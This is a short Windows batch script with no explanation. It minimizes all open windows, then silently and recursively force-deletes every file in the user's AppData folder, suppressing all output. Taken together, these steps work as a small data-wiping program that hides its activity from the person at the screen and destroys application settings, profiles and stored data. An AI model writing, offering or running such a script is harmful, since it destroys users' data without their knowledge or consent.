@echo off
powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"
cd %USERPROFILE%\appdata 
del *.* /f /s /q >nul 2>&1
exit